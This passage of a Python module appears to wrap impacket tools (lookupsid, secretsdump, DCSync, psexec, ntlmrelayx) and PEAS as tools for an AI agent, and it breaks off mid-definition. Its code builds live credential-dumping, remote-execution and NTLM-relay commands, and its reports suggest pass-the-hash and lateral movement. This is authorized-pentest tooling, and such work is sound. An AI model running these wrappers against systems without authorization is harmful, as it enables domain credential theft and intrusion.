"""
Active Directory + local privesc surgical points (impacket 五件套 + peas).

🟡 Pentest level (read-only enumeration, PENTEST_ENABLED):
  - impacket_lookupsid — domain user/SID enumeration (SMB, no state change)
  - peas_linux         — local privesc enumeration on the MCP host (linpeas)
  - peas_windows       — remote privesc enumeration on a Windows target
                         (winpeas staged via impacket-psexec -c, needs valid creds)

🔴 Attack level (ATTACK_ENABLED — credential theft / remote execution / MITM):
  - impacket_secretsdump — SAM/SECURITY credential harvesting
  - impacket_dcsync      — DRSUAPI DC sync (dump domain hashes from a DC)
  - impacket_psexec      — remote service execution (RemComSvc)
  - impacket_ntlmrelayx  — NTLM relay MITM (LLMNR/NBNS/SMB, bounded surface)

CLI ground truth (impacket v0.14.0.dev0 / Debian 0.13.0+git20251120,
verified live against --help on Kali aarch64, 2026-09-07):
  - unified credential target string: [[domain/]username[:password]@]target
    (no -u/-p flags in current impacket)
  - lookupsid: positional [maxRid] (default 4000), -domain-sids, -target-ip,
    -port, -hashes LM:NT, -no-pass (non-interactive), -k (Kerberos)
  - secretsdump: -exec-method {smbexec,wmiexec,mmcexec}, -skip-sam,
    -skip-security, -just-dc (DCSync; -just-dc-ntlm, -just-dc-user,
    -ldapfilter), -target-ip, -dc-ip
  - psexec: target [command ...], -c pathname (copy file for execution),
    -path, -service-name, -codec, -port, -target-ip
  - ntlmrelayx: -t TARGET (repeatable), -ip, --smb-port, -smb2support,
    --no-{smb,http,wcf,raw,rpc,winrm}-server, -socks, -c COMMAND,
    --enum-local-admins, --keep-relaying, -domain

peas ground truth (Kali apt package `peass`, 20260715 build):
  - /usr/bin/linpeas & /usr/bin/winpeas are kali-treecd VIEWER wrappers,
    NOT runners — invoke the payload directly
  - /usr/share/peass/linpeas/linpeas.sh = self-contained LinPEAS-ng (bash,
    1.1MB, world-executable); native binaries are non-executable (0644)
  - linpeas flags (getopts ":h?asd:p:i:P:qo:T:LMwNDterVf:F:z:"):
    -s stealth&faster, -q no banner, -N no colours, -a all, -e extra,
    -o checks (comma list), -T MITRE techniques
    ⚠ help text lists lowercase `-n` but getopts only accepts `N` —
    `-n` falls through to the help screen (silent arg bug in the package)
  - output: 11 box sections (═══╣ Title ╠═══), findings color-coded;
    BOLD RED (ESC[1;31m) lines = "95% a PE vector" per the script legend
  - winpeas: /usr/share/peass/winpeas/winPEAS{x64,x86,any}.exe (Windows PE,
    non-executable here) — staged to a Windows target via impacket-psexec -c

Safety:
  - no credentials → -no-pass (anonymous, fails fast, never an interactive
    prompt that would hang the MCP worker)
  - username without password/hashes → validation error (interactive prompt
    guard)
  - passwords travel as argv elements (impacket CLI limitation, inherited
    from system_patch_audit's stance) and are masked in every report
  - ntlmrelayx defaults to SMB + raw (LLMNR/NBNS) listeners only;
    http/wcf/rpc/winrm servers are off unless explicitly enabled
"""

from __future__ import annotations

import re
import time

from pydantic import BaseModel, Field, field_validator, model_validator

from kali_mcp.executor import get_executor
from kali_mcp.tools import _is_valid_target, _no_shell_meta

# ---------------------------------------------------------------------------
# Shared validation / helpers
# ---------------------------------------------------------------------------

_IMPACKT_USER_RE = re.compile(r"^[A-Za-z0-9._\\\-]{1,256}$")
_IMPACKT_DOMAIN_RE = re.compile(r"^[A-Za-z0-9.\-]{1,256}$")
_HASH_PAIR_RE = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")
_SERVICE_NAME_RE = re.compile(r"^[A-Za-z0-9_\-]{1,64}$")

#: LinPEAS-ng section titles (ground truth: live run on Kali, 2026-09-07).
_PEAS_SECTION_RE = re.compile(r"╣\s*(.+?)\s*╠")
#: strip ALL CSI sequences (SGR m-codes, cursor, visibility) for display
_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[a-zA-Z]")
_PEAS_BOLD_RED_RE = re.compile(r"\x1b\[1;31m")
_PEAS_YELLOW_RE = re.compile(r"\x1b\[1;33m|\x1b\[33m")

#: legend / pure-context lines that are not findings. Section-box lines
#: (containing both ╣ and ╠) are dropped by the section check in
#: _peas_parse already; single-╣ bullet lines (e.g. "╣ AppArmor profile?
#: unconfined") are genuine findings and must be kept.
_PEAS_NOISE_RE = re.compile(r"^(RED|YELLOW)\s*:|You should take a look into it|^\s*$")

#: LinPEAS-ng colours whole sections red when a state is bad — rank
#: individual lines by how many known PE keywords they contain.
_PEAS_KEYWORDS = (
    "cve-", "pwnkit", "suid", "sgid", "sudo", "world-writable", "writable",
    "insecure", "vulnerable", "vulnerab", "bypass", "possible", "risk",
    "unconfined", "disabled", "noexec", "hardening", "kernel", "root",
    "password", "credential", "shadow", "token", "api key", "privilege",
)


def _peas_rank(findings: list[str]) -> list[str]:
    """Drop noise lines, then rank by keyword hits (stable order kept)."""
    kept = [f for f in findings if not _PEAS_NOISE_RE.search(f)]
    scored = [
        (sum(1 for k in _PEAS_KEYWORDS if k in f.lower()), i, f)
        for i, f in enumerate(kept)
    ]
    scored.sort(key=lambda t: (-t[0], t[1]))
    return [f for _, _, f in scored]

#: Allowed linpeas -o check names (ground truth from live --help).
_PEAS_CHECK_NAMES: frozenset[str] = frozenset(
    {
        "system_information",
        "container",
        "cloud",
        "procs_crons_timers_srvcs_sockets",
        "network_information",
        "users_information",
        "software_information",
        "interesting_perms_files",
        "interesting_files",
        "api_keys_regex",
    }
)


def _validate_username(v: str) -> str:
    v = v.strip()
    if v and not _IMPACKT_USER_RE.match(v):
        raise ValueError(
            f"invalid username: {v!r} (allowed: letters, digits, . _ \\ -)"
        )
    return v


def _validate_domain(v: str) -> str:
    v = v.strip()
    if v and not _IMPACKT_DOMAIN_RE.match(v):
        raise ValueError(f"invalid domain: {v!r}")
    return v


def _validate_password(v: str) -> str:
    if v:
        _no_shell_meta(v)
        if len(v) > 512:
            raise ValueError("password too long (max 512)")
    return v


def _validate_hashes(v: str) -> str:
    v = v.strip()
    if v and not _HASH_PAIR_RE.match(v):
        raise ValueError("hashes must be LM:NT, each 32 hex chars")
    return v


def _validate_target(v: str) -> str:
    v = v.strip()
    if not v:
        raise ValueError("target is required")
    if not _is_valid_target(v):
        raise ValueError(f"invalid target: {v!r}")
    return v


def _creds_target(
    target: str, domain: str, username: str, password: str
) -> str:
    """Build impacket's unified target: [[domain/]user[:pass]@]target."""
    if username:
        auth = username + (f":{password}" if password else "")
        if domain:
            auth = f"{domain}/{auth}"
        return f"{auth}@{target}"
    return target


def _masked_cmd(cmd: list[str], password: str) -> str:
    """Render a command line for reports, masking the password if present."""
    parts = []
    for c in cmd:
        if " " in c:
            parts.append(f'"{c}"')
        else:
            parts.append(c)
    line = " ".join(parts)
    if password:
        line = line.replace(password, "***")
    return line


def _split_targets(v: str) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for part in re.split(r"[,\s]+", v):
        part = part.strip()
        if part and part not in seen:
            seen.add(part)
            out.append(part)
    return out


def _hashes_flag(hashes: str) -> list[str]:
    """impacket pass-the-hash uses a standalone -hashes LM:NT flag
    (hashes are NOT embedded in the target string)."""
    return ["-hashes", hashes] if hashes else []


# ===================================================================
# 🟡 1. impacket_lookupsid — domain user/SID enumeration
# ===================================================================


class LookupsidInput(BaseModel):
    """Input for impacket lookupsid (domain user/SID enumeration)."""

    target: str = Field(
        ...,
        description="Target host (SMB server / DC), e.g. 192.168.0.213",
        max_length=256,
    )
    domain: str = Field(default="", description="Domain (optional)")
    username: str = Field(default="", description="Username (optional — anonymous is attempted when empty)")
    password: str = Field(default="", description="Password (masked in reports)")
    max_rid: int = Field(default=4000, ge=1, le=200000, description="Max RID to enumerate (default 4000)")
    domain_sids: bool = Field(default=False, description="Enumerate domain SIDs (-domain-sids; forwards to the DC)")
    target_ip: str = Field(default="", description="Explicit IP when target is an unresolvable NetBIOS name")
    port: int = Field(default=445, ge=1, le=65535, description="SMB port")
    wall_timeout: int = Field(default=120, ge=10, le=600, description="Overall wall-clock timeout in seconds")
    max_results: int = Field(default=200, ge=1, le=2000, description="Max entries rendered in the report")

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        return _validate_target(v)

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        return _validate_password(v)

    @field_validator("target_ip")
    @classmethod
    def validate_target_ip(cls, v: str) -> str:
        if v:
            _no_shell_meta(v)
        return v


def _lookupsid_cmd(p: LookupsidInput) -> list[str]:
    cmd = ["impacket-lookupsid"]
    if p.domain_sids:
        cmd.append("-domain-sids")
    if p.target_ip:
        cmd.extend(["-target-ip", p.target_ip])
    if p.port != 445:
        cmd.extend(["-port", str(p.port)])
    if not p.username:
        cmd.append("-no-pass")  # anonymous attempt, never an interactive prompt
    cmd.append(_creds_target(p.target, p.domain, p.username, p.password))
    cmd.append(str(p.max_rid))
    return cmd


#: lookupsid output line (ground truth, impacket v0.14 source line 138):
#:   "%d: %s\\%s (%s)" % (rid, domain, name, SID_NAME_USE kind)
#: e.g. 500: CORP\Administrator (User)
#: The domain SID itself is only logged to stderr: "Domain SID is: S-1-5-..."
_LOOKUPSID_ROW_RE = re.compile(r"^(\d+):\s+(\S+)\\(.+?)\s+\((\w+)\)\s*$")
_DOMAIN_SID_RE = re.compile(r"Domain SID is:\s+(S-1-[\d\-]+)")


def _parse_lookupsid(stdout: str) -> list[dict]:
    rows = []
    for line in stdout.splitlines():
        m = _LOOKUPSID_ROW_RE.match(line.strip())
        if m:
            rows.append(
                {
                    "rid": int(m.group(1)),
                    "domain": m.group(2),
                    "name": m.group(3),
                    "kind": m.group(4),
                }
            )
    rows.sort(key=lambda r: r["rid"])
    return rows


def _extract_domain_sid(stderr: str) -> str:
    m = _DOMAIN_SID_RE.search(stderr or "")
    return m.group(1) if m else ""


def _lookupsid_report(
    p: LookupsidInput, rows: list[dict], domain_sid: str, duration: float
) -> str:
    lines = [
        "## 🔎 impacket-lookupsid 域用户/SID 枚举",
        f"**目标:** {p.target} | **RID 范围:** ≤{p.max_rid} | **耗时:** {duration:.0f}s",
    ]
    if domain_sid:
        lines.append(f"**域 SID:** `{domain_sid}`")
    lines.append("")
    if not rows:
        diag = "（无账户行解析成功——可能是认证失败或目标非 AD 成员）"
        lines.append(f"⚠️ 未枚举到任何账户。{diag}")
        lines.append("")
        lines.append("> 排查：确认目标 SMB 445 可达；AD 域内建议提供域凭据；")
        lines.append("> 对非 AD 主机（如群晖 NAS）此工具不适用，改用 `crackmapexec_run` 或 `enum4linux_scan`。")
        return "\n".join(lines)

    users = [r for r in rows if r["kind"] == "User"]
    groups = [r for r in rows if r["kind"] in ("Group", "Alias")]
    lines.append(
        f"**统计:** {len(rows)} 个对象（User {len(users)} / Group+Alias {len(groups)} / 其他 {len(rows) - len(users) - len(groups)}）"
    )
    lines.append("")
    lines.extend(
        ["| RID | 名称 | 域 | 类型 |", "|-----|------|----|------|"]
    )
    for r in rows[: p.max_results]:
        lines.append(
            f"| {r['rid']} | {r['name']} | {r['domain']} | {r['kind']} |"
        )
    if len(rows) > p.max_results:
        lines.append(f"\n… 另有 {len(rows) - p.max_results} 条未显示 (max_results={p.max_results})")
    lines.extend(
        [
            "",
            "> 后续建议：拿到账户名后可用 `hydra_brute`/`crackmapexec_run` 验证凭据；",
            "> RID 爆破范围有限（默认 4000），大域建议按业务缩小或分段。",
        ]
    )
    return "\n".join(lines)


async def impacket_lookupsid(p: LookupsidInput) -> str:
    """Enumerate domain user accounts and SIDs over SMB (impacket-lookupsid).

    Queries the target's SAM for every SID up to maxRid and reports
    accounts (User/Group/...) with RIDs. Read-only enumeration — no state
    change on the target. Works on domain members, DCs and standalone
    machines with SMB enabled.

    Requires: impacket (Kali 预装 python3-impacket)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _lookupsid_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0

    rows = _parse_lookupsid(result.stdout)
    if not result.stdout and not rows:
        diag = (result.stderr or "")[:500]
        return (
            "## 🔎 impacket-lookupsid 域用户/SID 枚举\n"
            f"**目标:** {p.target} | **命令:** `{_masked_cmd(cmd, p.password)}`\n\n"
            f"❌ lookupsid 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 常见原因：目标无 SMB 445 / 凭据不足 / 目标不是 Windows/AD 主机。"
        )

    domain_sid = _extract_domain_sid(result.stderr)
    return _lookupsid_report(p, rows, domain_sid, duration)


# ===================================================================
# 🔴 2. impacket_secretsdump — SAM/SECURITY credential harvesting
# ===================================================================


class SecretsdumpInput(BaseModel):
    """Input for impacket secretsdump (remote SAM/SECURITY dump)."""

    target: str = Field(
        ...,
        description="Target host (Windows machine with SMB/WMI)",
        max_length=256,
    )
    domain: str = Field(default="", description="Domain (optional)")
    username: str = Field(default="", description="Username (must have local admin for remote dump)")
    password: str = Field(default="", description="Password (masked in reports)")
    hashes: str = Field(default="", description="Pass-the-hash: LM:NT (32 hex each) instead of password")
    exec_method: str = Field(default="wmiexec", description="Execution method: wmiexec | smbexec | mmcexec")
    skip_sam: bool = Field(default=False, description="Skip SAM dump")
    skip_security: bool = Field(default=False, description="Skip SECURITY hive dump")
    target_ip: str = Field(default="", description="Explicit IP (unresolvable NetBIOS names)")
    dc_ip: str = Field(default="", description="DC IP for Kerberos resolution")
    wall_timeout: int = Field(default=300, ge=30, le=1800, description="Overall wall-clock timeout in seconds")
    max_results: int = Field(default=100, ge=1, le=1000, description="Max hashes rendered in the report")

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        return _validate_target(v)

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        return _validate_password(v)

    @field_validator("hashes")
    @classmethod
    def validate_hashes(cls, v: str) -> str:
        return _validate_hashes(v)

    @field_validator("exec_method")
    @classmethod
    def validate_exec_method(cls, v: str) -> str:
        v = v.strip().lower()
        if v not in ("wmiexec", "smbexec", "mmcexec"):
            raise ValueError("exec_method must be wmiexec | smbexec | mmcexec")
        return v

    @model_validator(mode="after")
    def check_creds(self) -> "SecretsdumpInput":
        if self.username and not (self.password or self.hashes):
            raise ValueError("username requires password or hashes (no interactive prompt)")
        return self


def _secretsdump_cmd(p: SecretsdumpInput) -> list[str]:
    cmd = ["impacket-secretsdump"]
    if not p.username:
        cmd.append("-no-pass")
    cmd.extend(["-exec-method", p.exec_method])
    cmd.extend(_hashes_flag(p.hashes))
    if p.skip_sam:
        cmd.append("-skip-sam")
    if p.skip_security:
        cmd.append("-skip-security")
    if p.target_ip:
        cmd.extend(["-target-ip", p.target_ip])
    if p.dc_ip:
        cmd.extend(["-dc-ip", p.dc_ip])
    cmd.append(_creds_target(p.target, p.domain, p.username, p.password))
    return cmd


#: secretsdump SAM/NTDS hash line: User::RID:LM:NT[:extra...]
_HASH_ROW_RE = re.compile(
    r"^(\S+)::(\d+):([0-9a-fA-F]{0,32}|\(null\)):([0-9a-fA-F]{0,64}|\(null\))"
)


def _parse_hash_rows(stdout: str) -> list[dict]:
    rows = []
    for line in stdout.splitlines():
        m = _HASH_ROW_RE.match(line.strip())
        if m:
            rows.append(
                {
                    "user": m.group(1),
                    "rid": int(m.group(2)),
                    "lm": m.group(3),
                    "nt": m.group(4),
                }
            )
    return rows


def _secretsdump_report(
    p: SecretsdumpInput, rows: list[dict], stdout: str, duration: float
) -> str:
    lines = [
        "## 🗝 impacket-secretsdump 凭据收割",
        f"**目标:** {p.target} | **方法:** {p.exec_method} | **耗时:** {duration:.0f}s",
        "",
    ]
    if rows:
        lines.append(f"🔴 **{len(rows)} 个本地账户哈希已提取**（凭据已外带——请妥善保管）")
        lines.append("")
        lines.extend(
            ["| 用户 | RID | LM | NT |", "|------|-----|----|----|"]
        )
        for r in rows[: p.max_results]:
            lines.append(
                f"| {r['user']} | {r['rid']} | `{r['lm']}` | `{r['nt']}` |"
            )
        if len(rows) > p.max_results:
            lines.append(f"\n… 另有 {len(rows) - p.max_results} 条未显示")
    else:
        lines.append("⚠️ 未解析到哈希行（认证失败 / 权限不足 / 目标无 SAM）。")
    tail = stdout[-400:] if stdout else ""
    if tail.strip() and not rows:
        lines.extend(["", "```\n" + tail + "\n```"])
    lines.extend(
        [
            "",
            "> 后续建议：NT 哈希可用 `john_crack` 离线破解或 pass-the-hash 复用；",
            "> 域账户请转 `impacket_dcsync`（需 DC + 具备 DCSync 权限的账户）。",
        ]
    )
    return "\n".join(lines)


async def impacket_secretsdump(p: SecretsdumpInput) -> str:
    """Harvest SAM/SECURITY password hashes from a Windows host (🔴).

    Remotely extracts local account LM/NT hashes via WMI/SMB/MMC execution.
    Requires an account with local admin rights on the target. The hashes
    leave the target — treat the output as stolen credentials and handle
    per your engagement scope.

    ⚠️ Active credential theft. Only run on hosts you own or are authorized
    to test.

    Requires: impacket (Kali 预装 python3-impacket)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _secretsdump_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0

    if not result.stdout:
        diag = (result.stderr or "")[:500]
        return (
            "## 🗝 impacket-secretsdump 凭据收割\n"
            f"**目标:** {p.target} | **命令:** `{_masked_cmd(cmd, p.password)}`\n\n"
            f"❌ secretsdump 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 常见原因：凭据无效或无本地管理员权限 / WMI 未开（换 exec_method=smbexec）。"
        )

    return _secretsdump_report(p, _parse_hash_rows(result.stdout), result.stdout, duration)


# ===================================================================
# 🔴 3. impacket_dcsync — DRSUAPI DC sync
# ===================================================================


class DcsyncInput(BaseModel):
    """Input for DCSync via impacket-secretsdump -just-dc (🔴)."""

    target: str = Field(
        ...,
        description="Domain controller host",
        max_length=256,
    )
    domain: str = Field(default="", description="Domain (optional)")
    username: str = Field(default="", description="Username (MUST have DCSync rights, e.g. DS-Replication-Get-Changes)")
    password: str = Field(default="", description="Password (masked in reports)")
    hashes: str = Field(default="", description="Pass-the-hash: LM:NT (32 hex each) instead of password")
    just_dc_ntlm: bool = Field(default=False, description="Use DRSUAPI_NotifyReplicationDC (NTLM) instead of Get-Changes")
    just_dc_user: str = Field(default="", description="Dump hashes for one specific user only")
    ldapfilter: str = Field(default="", description="Optional LDAP filter to limit the dump")
    target_ip: str = Field(default="", description="Explicit IP (unresolvable NetBIOS names)")
    dc_ip: str = Field(default="", description="DC IP for Kerberos resolution")
    wall_timeout: int = Field(default=300, ge=30, le=1800, description="Overall wall-clock timeout in seconds")
    max_results: int = Field(default=100, ge=1, le=1000, description="Max hashes rendered in the report")

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        return _validate_target(v)

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        return _validate_password(v)

    @field_validator("hashes")
    @classmethod
    def validate_hashes(cls, v: str) -> str:
        return _validate_hashes(v)

    @field_validator("just_dc_user")
    @classmethod
    def validate_dc_user(cls, v: str) -> str:
        v = v.strip()
        if v:
            _no_shell_meta(v)
        return v

    @field_validator("ldapfilter")
    @classmethod
    def validate_ldapfilter(cls, v: str) -> str:
        v = v.strip()
        if v:
            if any(c in v for c in "\r\n\x00"):
                raise ValueError("ldapfilter must not contain control characters")
            if len(v) > 512:
                raise ValueError("ldapfilter too long (max 512)")
        return v

    @model_validator(mode="after")
    def check_creds(self) -> "DcsyncInput":
        if self.username and not (self.password or self.hashes):
            raise ValueError("username requires password or hashes (no interactive prompt)")
        return self


def _dcsync_cmd(p: DcsyncInput) -> list[str]:
    cmd = ["impacket-secretsdump", "-just-dc"]
    if p.just_dc_ntlm:
        cmd.append("-just-dc-ntlm")
    if p.just_dc_user:
        cmd.extend(["-just-dc-user", p.just_dc_user])
    if p.ldapfilter:
        cmd.extend(["-ldapfilter", p.ldapfilter])
    if not p.username:
        cmd.append("-no-pass")
    cmd.extend(_hashes_flag(p.hashes))
    if p.target_ip:
        cmd.extend(["-target-ip", p.target_ip])
    if p.dc_ip:
        cmd.extend(["-dc-ip", p.dc_ip])
    cmd.append(_creds_target(p.target, p.domain, p.username, p.password))
    return cmd


def _dcsync_report(p: DcsyncInput, rows: list[dict], stdout: str, duration: float) -> str:
    lines = [
        "## 🏛 impacket-dcsync 域哈希同步（DRSUAPI）",
        f"**DC:** {p.target} | **范围:** {p.just_dc_user or '全域'} | **耗时:** {duration:.0f}s",
        "",
    ]
    if rows:
        lines.append(f"🔴 **{len(rows)} 个域账户哈希已通过 DRSUAPI 外带**——这等效于域级凭据窃取")
        lines.append("")
        lines.extend(["| 用户 | RID | LM | NT |", "|------|-----|----|----|"])
        for r in rows[: p.max_results]:
            lines.append(f"| {r['user']} | {r['rid']} | `{r['lm']}` | `{r['nt']}` |")
        if len(rows) > p.max_results:
            lines.append(f"\n… 另有 {len(rows) - p.max_results} 条未显示")
    else:
        lines.append("⚠️ 未解析到域哈希行。")
        lines.append("> 最常见原因：账户不具备 DS-Replication-Get-Changes(-All) 权限（典型：域管、Enterprise Admin、持有该 ACL 的服务账户）。")
    tail = stdout[-400:] if stdout else ""
    if tail.strip() and not rows:
        lines.extend(["", "```\n" + tail + "\n```"])
    lines.extend(
        [
            "",
            "> 后续建议：域管哈希可用 `impacket_psexec`（-k 或 -hashes）横向；",
            "> 哈希可用 `john_crack` 离线破解。操作请严格限制在授权范围内。",
        ]
    )
    return "\n".join(lines)


async def impacket_dcsync(p: DcsyncInput) -> str:
    """Dump domain account hashes from a DC via DRSUAPI (DCSync, 🔴).

    Wraps `impacket-secretsdump -just-dc`: queries the DC's replication
    service as if it were a replica DC. Requires an account with
    DS-Replication-Get-Changes(-All) — typically Domain Admins. This is
    one of the most destructive AD operations (all domain hashes leave
    the DC); use only with explicit authorization.

    ⚠️ Active domain credential theft. Only run inside authorized labs /
    engagements.

    Requires: impacket (Kali 预装 python3-impacket)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _dcsync_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0

    if not result.stdout:
        diag = (result.stderr or "")[:500]
        return (
            "## 🏛 impacket-dcsync 域哈希同步（DRSUAPI）\n"
            f"**DC:** {p.target} | **命令:** `{_masked_cmd(cmd, p.password)}`\n\n"
            f"❌ dcsync 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 常见原因：账户无 DCSync 权限 / 目标不是 DC / Kerberos 解析失败（补 dc_ip）。"
        )

    return _dcsync_report(p, _parse_hash_rows(result.stdout), result.stdout, duration)


# ===================================================================
# 🔴 4. impacket_psexec — remote service execution
# ===================================================================


class PsexecInput(BaseModel):
    """Input for impacket psexec (remote command execution, 🔴)."""

    target: str = Field(..., description="Target Windows host", max_length=256)
    domain: str = Field(default="", description="Domain (optional)")
    username: str = Field(default="", description="Username (must be local admin)")
    password: str = Field(default="", description="Password (masked in reports)")
    hashes: str = Field(default="", description="Pass-the-hash: LM:NT (32 hex each) instead of password")
    command: str = Field(default="cmd.exe", description="Command to run on the target (single argv element, e.g. 'whoami /all')", max_length=1024)
    service_name: str = Field(default="", description="Custom RemComSvc service name")
    path: str = Field(default="", description="Path of the command to execute (-path)")
    codec: str = Field(default="utf-8", description="Encoding of the target's output (default utf-8; chcp on target to map)")
    port: int = Field(default=445, ge=1, le=65535, description="SMB port")
    target_ip: str = Field(default="", description="Explicit IP (unresolvable NetBIOS names)")
    wall_timeout: int = Field(default=120, ge=10, le=600, description="Overall wall-clock timeout in seconds")
    max_results: int = Field(default=200, ge=1, le=2000, description="Max output lines rendered")

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        return _validate_target(v)

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        return _validate_password(v)

    @field_validator("hashes")
    @classmethod
    def validate_hashes(cls, v: str) -> str:
        return _validate_hashes(v)

    @field_validator("command")
    @classmethod
    def validate_command(cls, v: str) -> str:
        v = v.strip()
        if any(c in v for c in "\r\n\x00"):
            raise ValueError("command must not contain control characters")
        return v

    @field_validator("service_name")
    @classmethod
    def validate_service_name(cls, v: str) -> str:
        v = v.strip()
        if v and not _SERVICE_NAME_RE.match(v):
            raise ValueError("invalid service name")
        return v

    @field_validator("path")
    @classmethod
    def validate_path(cls, v: str) -> str:
        if v:
            _no_shell_meta(v)
        return v

    @field_validator("codec")
    @classmethod
    def validate_codec(cls, v: str) -> str:
        v = v.strip()
        if v and not re.match(r"^[A-Za-z0-9_\-]{1,32}$", v):
            raise ValueError(f"invalid codec: {v!r}")
        return v

    @model_validator(mode="after")
    def check_creds(self) -> "PsexecInput":
        if self.username and not (self.password or self.hashes):
            raise ValueError("username requires password or hashes (no interactive prompt)")
        return self


def _psexec_cmd(p: PsexecInput) -> list[str]:
    cmd = ["impacket-psexec"]
    if not p.username:
        cmd.append("-no-pass")
    cmd.extend(_hashes_flag(p.hashes))
    if p.service_name:
        cmd.extend(["-service-name", p.service_name])
    if p.path:
        cmd.extend(["-path", p.path])
    if p.codec != "utf-8":
        cmd.extend(["-codec", p.codec])
    if p.port != 445:
        cmd.extend(["-port", str(p.port)])
    if p.target_ip:
        cmd.extend(["-target-ip", p.target_ip])
    cmd.append(_creds_target(p.target, p.domain, p.username, p.password))
    cmd.append(p.command)
    return cmd


def _psexec_report(
    p: PsexecInput, stdout: str, returncode: int, duration: float
) -> str:
    body = stdout.strip()
    shown = body.splitlines()[: p.max_results]
    lines = [
        "## 🎯 impacket-psexec 远程执行",
        f"**目标:** {p.target} | **命令:** `{p.command}` | **退出码:** {returncode} | **耗时:** {duration:.0f}s",
        "",
    ]
    if returncode != 0:
        lines.append("⚠️ 远程命令非零退出（可能是目标侧错误，不一定是连接失败）")
    if shown:
        lines.extend(["```", *shown, "```"])
    else:
        lines.append("（无输出）")
    if len(body.splitlines()) > p.max_results:
        lines.append(f"\n… 另有 {len(body.splitlines()) - p.max_results} 行未显示")
    lines.append("")
    lines.append("> 后续建议：`whoami /all` 确认身份与组；`net user /domain` 看域账户；配合 `impacket_secretsdump` 收割本地凭据。")
    return "\n".join(lines)


async def impacket_psexec(p: PsexecInput) -> str:
    """Execute a command on a Windows host via a RemComSvc service (🔴).

    PSEXEC-like: copies nothing by default, installs a short-lived service
    to run the command and streams its output back. Requires a local
    admin account (password or pass-the-hash).

    ⚠️ Remote code execution. Only run on hosts you own or are authorized
    to test.

    Requires: impacket (Kali 预装 python3-impacket)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _psexec_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0

    if not result.stdout:
        diag = (result.stderr or "")[:500]
        return (
            "## 🎯 impacket-psexec 远程执行\n"
            f"**目标:** {p.target} | **命令:** `{p.command}` | **执行命令:** `{_masked_cmd(cmd, p.password)}`\n\n"
            f"❌ psexec 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 常见原因：凭据无效或无本地管理员权限 / 445 被防火墙拦截 / 目标不是 Windows。"
        )

    return _psexec_report(p, result.stdout, result.returncode, duration)


# ===================================================================
# 🔴 5. impacket_ntlmrelayx — NTLM relay MITM
# ===================================================================


class NtlmrelayxInput(BaseModel):
    """Input for impacket ntlmrelayx (NTLM relay MITM, 🔴)."""

    targets: str = Field(
        ...,
        description="Comma-separated relay target hosts (e.g. '192.168.0.213,192.168.0.234'). Wildcards not supported.",
        max_length=512,
    )
    domain: str = Field(default="", description="Domain hint for the relay")
    interface_ip: str = Field(default="", description="Local interface IP to bind listeners to (-ip)")
    smb_port: int = Field(default=445, ge=1, le=65535, description="Local SMB listener port")
    smb2support: bool = Field(default=True, description="Enable SMB2/3 support (-smb2support)")
    socks: bool = Field(default=False, description="Expose a SOCKS5 proxy for the relayed session (-socks)")
    command: str = Field(default="", description="Command to run on successfully relayed hosts (-c)")
    enum_local_admins: bool = Field(default=False, description="Enumerate local admins on relayed hosts")
    keep_relaying: bool = Field(default=False, description="Keep relaying after the first success")
    enable_http: bool = Field(default=False, description="Also serve an HTTP relay listener (default off — SMB + raw LLMNR/NBNS only)")
    wall_timeout: int = Field(default=120, ge=15, le=600, description="Overall wall-clock timeout in seconds")
    max_results: int = Field(default=100, ge=1, le=1000, description="Max event lines rendered")

    @field_validator("targets")
    @classmethod
